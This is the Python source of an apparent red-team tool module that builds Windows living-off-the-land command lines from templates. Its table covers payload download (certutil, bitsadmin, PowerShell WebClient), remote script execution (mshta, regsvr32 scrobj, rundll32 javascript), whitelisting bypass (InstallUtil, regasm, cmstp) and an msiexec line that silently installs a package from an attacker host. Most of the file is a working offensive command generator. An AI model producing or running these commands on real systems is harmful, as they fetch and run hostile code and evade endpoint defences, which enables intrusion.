# language: Python, file: Program/payload/lolbin.py, target: Red Sky payload — LOLBin
# Generate living-off-the-land binary command lines for common actions.

import sys
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


ACTIONS = {
    "download": [
        ("certutil",    'certutil -urlcache -split -f {url} {out}'),
        ("bitsadmin",   'bitsadmin /transfer job /download /priority normal {url} {out}'),
        ("powershell",  'powershell -c "(New-Object Net.WebClient).DownloadFile(\'{url}\',\'{out}\')"'),
        ("curl",        'curl -o {out} {url}'),
        ("wget",        'wget -O {out} {url}'),
        ("mshta",       'mshta {url}'),
        ("expand",      'expand {url} -F:* {out}'),
        ("esentutl",    'esentutl /y /vss {url} /d {out}'),
    ],
    "execute": [
        ("mshta",       'mshta {url}'),
        ("regsvr32",    'regsvr32 /s /n /u /i:{url} scrobj.dll'),
        ("rundll32",    'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:{url}")'),
        ("wmic",        'wmic process call create "{cmd}"'),
        ("msiexec",     'msiexec /q /i {url}'),
        ("installutil", 'InstallUtil.exe /logfile= /LogToConsole=false /U {path}'),
        ("regasm",      'regasm.exe /U {path}'),
        ("regsvcs",     'regsvcs.exe {path}'),
        ("cmstp",       'cmstp.exe /ni /s {inf_path}'),
    ],
    "evade": [
        ("wmic",        'wmic process call create "cmd /c {cmd}"'),
        ("rundll32",    'rundll32.exe advpack.dll,LaunchINFSection {inf_path},DefaultInstall'),
        ("msiexec",     'msiexec /q /i https://attacker.tld/payload.msi'),
        ("pcalua",      'pcalua.exe -a {path}'),
        ("forfiles",    'forfiles /p c:\\windows\\system32 /m notepad.exe /c "{cmd}"'),
    ],
    "compile": [
        ("csc",         'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:{out} {src}'),
        ("msbuild",     'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {xml}'),
    ],
}


def cmd_list() -> int:
    print_info(f"{len(ACTIONS)} LOLBin action categories")
    print()
    for cat, entries in ACTIONS.items():
        print(f"  {ARTERY}{BOLD}{cat}{RESET}")
        for name, tmpl in entries:
            print(f"    {ARTERY}▓{RESET} {BONE}{name:<14}{RESET} {ASH}{tmpl[:80]}{RESET}")
        print()
    return 0


def cmd_gen(category: str, **kwargs) -> int:
    if category not in ACTIONS:
        print_err(f"unknown category: {category}")
        print_info(f"available: {', '.join(ACTIONS.keys())}")
        return 2

    print_info(f"LOLBin commands for: {category}")
    if kwargs:
        print_kv("vars", ", ".join(f"{k}={v}" for k, v in kwargs.items()))
    print()

    for name, tmpl in ACTIONS[category]:
        try:
            cmd = tmpl.format(**kwargs)
        except KeyError as e:
            print(f"  {ARTERY}▓{RESET} {BONE}{name:<14}{RESET} {CLOT}(needs {e}){RESET}")
            continue
        print(f"  {ARTERY}▓{RESET} {BONE}{name:<14}{RESET}")
        print(f"      {SCARLET}{cmd}{RESET}")
    return 0


def run_cli(args: List[str]) -> int:
    if not args or args[0] == "list":
        return cmd_list()

    category = args[0]
    kwargs = {}
    for a in args[1:]:
        if "=" in a:
            k, v = a.split("=", 1)
            kwargs[k] = v
    return cmd_gen(category, **kwargs)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
